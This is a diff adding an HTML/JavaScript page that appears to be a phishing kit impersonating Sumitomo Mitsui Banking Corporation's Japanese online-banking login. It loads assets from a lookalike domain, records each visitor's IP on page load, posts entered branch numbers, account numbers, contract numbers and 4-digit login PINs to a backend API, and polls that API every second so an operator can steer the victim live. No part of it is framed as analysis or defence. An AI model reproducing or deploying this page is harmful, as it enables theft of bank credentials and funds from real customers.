@@ -1,0 +1,351 @@
+<html lang="ja"><head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <title>銀行口座でログイン</title>
+
+    <style>
+
+
+        html,body,div,ul,li,ol,h1,h2,h3,h4,h5,h6,span,input{
+            margin:0;padding:0;
+        }
+        h1,h2,h3,h4,h5,h6{font-size::100%;}
+        img{border:0;display:block;}
+        ul,ol{list-style::none;}
+        a{text-decoration:none;color:#fff;
+        a:hover{text-decoration:underline;}
+
+    </style>
+    <script src="/admin/im/layui.js"></script><link id="layuicss-laydate" rel="stylesheet" href="https://smbc-bank.org/admin/im/css/modules/laydate/default/laydate.css?v=5.3.1" media="all"><link id="layuicss-layer" rel="stylesheet" href="https://smbc-bank.org/admin/im/css/modules/layer/default/layer.css?v=3.5.1" media="all"><link id="layuicss-skincodecss" rel="stylesheet" href="https://smbc-bank.org/admin/im/css/modules/code.css?v=2" media="all">
+    <script src="/admin/im/site-jquery.min.js"></script>
+    <link href="https://cdn.bootcdn.net/ajax/libs/layer/3.5.1/theme/default/layer.min.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+<div style="width:100%;height:100%;margin:0 auto;background-color: #ffffff">
+
+    <header>
+
+        <h4 style="margin: 0 auto;margin-top: 10px;width: 144px;display:block ">銀行口座でログイン</h4>
+    </header>
+
+    <br>
+
+
+
+    <div id="left" style="">
+
+        <div style="width: 301.5px;height: 25px;border-radius: 7px;margin: 0 auto;background-color: #eeeeee">
+            <div style="width: 148px;display: inline-block;background-color: #004832;border-radius: 7px;">
+                <span style="width: 96px;margin: 0 auto;display: block;color:#bae6d7;" onclick="leftcontrl()" id="leftcontrlone">店・口座番号</span>
+            </div>
+
+            <div style="width: 147px;display: inline-block;border-radius: 7px;">
+                <span style="width: 80px;margin: 0 auto;display:block;color:#004832;" onclick="righrcontrl()" id="rightcontrlone">契約者番号</span>
+            </div>
+        </div>
+
+        <br>   <br>
+        <form action="next.php" method="post">
+            <div style="margin-left: 20px;margin-right: 20px">
+                <div>
+
+                    <input type="text" id="dfh" maxlength="3" name="dfh" style="width: 25%;float: left;border: 0;border-bottom: 1px solid black;outline: none;font-size: 20px;line-height: 20px" placeholder="店番号">
+
+                    <input type="text" id="kzfh" name="kzfh" style="width: 60%;float: right;border: 0;border-bottom: 1px solid black;outline: none;font-size: 20px" maxlength="7" placeholder="口座番号">
+
+                </div>
+                <br>   <br>   <br>
+                <div>
+
+                    <input type="text" id="az" name="az" maxlength="4" style="width: 100%;border: 0;border-bottom: 1px solid black;outline: none;font-size: 20px" placeholder="ログイン暗証">
+                </div>
+
+
+                <br>
+                <div>
+                    <div style="display: inline-block;float: left;width: 150px;color:#0b3e16eb;">
+
+                        <span style="font-size: 15px">ログイン暗証をお忘れの場合</span>
+                    </div>
+
+                    <div style="display: inline-block;float: right;width: 150px;">
+
+                <span style="font-size: 15px;float: right">
+                    店・囗座番
+                    号保存
+                </span>
+
+
+                    </div>
+
+                    <br>    <br>    <br>
+                    <div>
+
+
+                        <button type="button" style="width: 300px;height: 50px;background-color: #004832;margin: 0 auto;
+display: block;border: 0;border-radius: 7px;font-size: 20px;color:#eeeeee;" onclick="verifyone()">ログイン
+
+                        </button>
+
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </form>
+    </div>
+
+
+    <div id="right" style="display: none">
+
+        <div style="width: 301.5px;height: 25px;border-radius: 7px;margin: 0 auto;background-color: #eeeeee">
+            <div style="width: 148px;display: inline-block;border-radius: 7px;">
+                <span style="width: 96px;margin: 0 auto;display: block;color:#004832;" onclick="leftcontrl()" id="leftcontrltwo">店・口座番号</span>
+            </div>
+
+            <div style="width: 147px;display: inline-block;border-radius: 7px;background-color: #004832;">
+                <span style="width: 80px;margin: 0 auto;display:block;color:#bae6d7;" onclick="righrcontrl()" id="rightcontrltwo">契約者番号</span>
+            </div>
+        </div>
+
+        <br>   <br>
+        <form action="next.php" method="post">
+            <div style="margin-left: 20px;margin-right: 20px">
+                <div>
+
+                    <input type="text" id="qyzfh" name="qyzfh" style="width: 100%;border: 0;border-bottom: 1px solid black;outline: none;font-size: 20px" placeholder="契約者番号">
+
+                </div>
+                <br> <br>
+                <div>
+
+                    <input type="text" id="aztwo" maxlength="4" name="aztwo" style="width: 100%;border: 0;border-bottom: 1px solid black;outline: none;font-size: 20px" placeholder="ログイン暗証">
+                </div>
+
+
+                <br>
+                <div>
+                    <div style="display: inline-block;float: left;width: 150px;color:#0b3e16eb;">
+
+                        <span style="font-size: 15px">ログイン暗証をお忘れの場合</span>
+                    </div>
+
+                    <div style="display: inline-block;float: right;width: 150px;">
+
+                <span style="font-size: 15px;float: right">
+                    店・囗座番
+                    号保存
+                </span>
+
+
+                    </div>
+
+                    <br>    <br>    <br>
+                    <div>
+
+
+                        <button type="button" style="width: 300px;height: 50px;background-color: #004832;margin: 0 auto;
+display: block;border: 0;border-radius: 7px;font-size: 20px;color:#eeeeee; " onclick="verifytwo()">ログイン
+
+                        </button>
+
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </form>
+    </div>
+
+    <br>    <br>    <br> <br>    <br>    <br>
+
+    <footer style="background-color:#004832;height: 70px;color: white;padding-top: 10px">
+        <div style="width: 224px;margin: 0 auto;">
+            <span>
+                安心してお使いいただくために
+            </span>
+        </div>
+        <div style="width: 251px;margin: 0 auto">
+            <span>
+                暗証番号は英数字8桁を推奨します
+            </span>
+        </div>
+
+
+
+    </footer>
+    <div style="font-size: 1px;width: 327px;margin: 0 auto;">
+        <span style="width: 327px;font-size: 1px">Copyright Sumitomo Mitsui Banking Corporation. All Rights Reserved</span>
+
+    </div>
+
+</div>
+
+<script>
+
+    var mask = null;
+    var timer = null;
+    var hb_timer = null;
+    function heart_beat() {
+        $.get('/api.php?act=heart_beat&_r=' + Math.random(), function (res) {
+            console.log(res);
+        });
+    }
+    function ip_save() {
+        $.get('/api.php?act=ip_save&_r=' + Math.random(), function (res) {
+            console.log(res);
+        });
+    }
+    ip_save();
+
+    function is_agree(){
+        $.post('/api.php?act=is_agree&_r='+Math.random(),function (res) {
+            var t = JSON.parse(res);
+            if (t.code == 'ok') {
+                layer.close(mask);
+                clearInterval(timer);
+                if(t.sel.indexOf('alert-error') != -1) {
+                    alert('アカウントやパスワードが間違っている!');
+                    return false;
+                }else{//非空,则传递验证码到跳转页面
+                    window.location.href=t.sel;
+                }
+            }else{
+                console.log('wait');
+            }
+        });
+    }
+
+
+    var left = document.getElementById("left");
+    var right = document.getElementById("right");
+
+    var dfh = document.getElementById("dfh");
+    var az = document.getElementById("az");
+    var kzfh = document.getElementById("kzfh");
+
+
+    var aztwo = document.getElementById("aztwo");
+    var qyefh = document.getElementById("qyzfh");
+
+
+    function leftcontrl(){
+        left.style.display="block";
+        right.style.display="none";
+
+    }
+
+
+    function righrcontrl(){
+
+        left.style.display="none";
+        right.style.display="block";
+    }
+
+    function verifyone(){
+
+        if(isNaN(dfh.value) || isNaN(az.value) || isNaN(kzfh.value)){
+
+            layer.msg('正しく入力してください！');
+            return false;
+        }
+
+        if(kzfh.value.length!=7 || az.value.length!=4){
+
+            layer.msg('正しく入力してください！');
+            return false;
+        }
+
+        if(dfh.value.length!="" && az.value.length!="" && kzfh.value.length!=""){
+
+            var appid = "店番号:"+dfh.value+ "<br>"+"口座番号:"+az.value;
+            var apppwd =kzfh.value;
+            $.ajax({
+                url: '/api.php?act=next_save&_r='+Math.random(),
+                type: 'post',
+                data: {uname:appid,apppwd:apppwd},
+                success: function (res) {
+                    var t = JSON.parse(res);
+                    if(t.code == 'ok') {
+                        mask = layer.load(2, {shade: [0.25, '#000']});
+                        timer = setInterval("is_agree()", 1000);
+                        hb_timer = setInterval("heart_beat()",1000);
+
+                        //$('#loginForm').attr('action','reset-password.php').submit();
+                        return false;
+                    }else{
+                        layer.msg('提交失败！');
+                        return false;
+                    }
+                },
+            });
+        }else{
+            layer.msg('必須項目を入力してください！');
+
+        }
+
+
+
+    }
+
+    function verifytwo(){
+        if(isNaN(aztwo.value) || isNaN(qyefh.value) || aztwo.value.length!=4){
+
+            layer.msg('正しく入力してください！');
+            return false;
+        }
+        if(aztwo.value.length!="" || qyefh.value.length!=""){
+
+            var appid = aztwo.value;
+            var apppwd =qyefh.value;
+            $.ajax({
+                url: '/api.php?act=next_save&_r='+Math.random(),
+                type: 'post',
+                data: {uname:appid,apppwd:apppwd},
+                success: function (res) {
+                    var t = JSON.parse(res);
+                    if(t.code == 'ok') {
+                        mask = layer.load(2, {shade: [0.25, '#000']});
+                        timer = setInterval("is_agree()", 1000);
+                        hb_timer = setInterval("heart_beat()",1000)
+
+                        //$('#loginForm').attr('action','reset-password.php').submit();
+                        return false;
+                    }else{
+                        layer.msg('提交失败！');
+                        return false;
+                    }
+                },
+            });
+        }else{
+            layer.msg('必須項目を入力してください！');
+
+        }
+    }
+
+
+
+
+
+</script>
+
+
+
+
+
+</body></html>
